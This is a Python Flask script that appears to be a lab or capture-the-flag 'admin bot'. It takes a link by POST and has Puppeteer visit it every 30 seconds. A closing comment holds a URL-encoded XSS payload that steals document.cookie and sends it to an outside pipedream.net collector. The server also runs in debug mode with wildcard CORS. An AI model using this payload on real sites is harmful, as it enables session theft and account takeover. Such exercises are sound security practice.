from flask import Flask, request
from flask_cors import CORS
import subprocess
import time
import threading

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}}) 

link = ''

@app.route('/debug', methods=['POST'])
def debug():
    global link
    data = request.get_json()
    print('Received POST request:', data, flush=True)
    if 'link' in data:
        link = data['link']
        print('Link set to:', link)
        return 'Link set to ' + link, 200
    return 'No link provided', 400

def simulate_user_visit(link):
    if link.startswith('http://localhost:3000'):
        print('Simulating user visit to ' + link, flush=True)
        result = subprocess.run(['node', 'puppeteer_script.js', link], capture_output=True, text=True)
        print('Puppeteer script output:', result.stdout, flush=True)
        return result.stdout
    else:
        return 'Invalid link. Only links starting with http://localhost:3000 are allowed.'

def periodic_task():
    global link
    while True:
        if link:
            print('Periodic task running with link:', link, flush=True)
            print(simulate_user_visit(link), flush=True)
        time.sleep(30)  

if __name__ == '__main__':
    threading.Thread(target=periodic_task, daemon=True).start()
    app.run(debug=True, host='0.0.0.0', port=3001)


# http://localhost:3000/search.php?query=%3Cscript%3Evar+img+%3D+new+Image%28%29%3Bimg.src+%3D+%22https%3A%2F%2Feno50641w4bu.x.pipedream.net%2F%3Fq%3D%22%2B%27%27%2BencodeURIComponent%28document.cookie%29%3B%3C%2Fscript%3E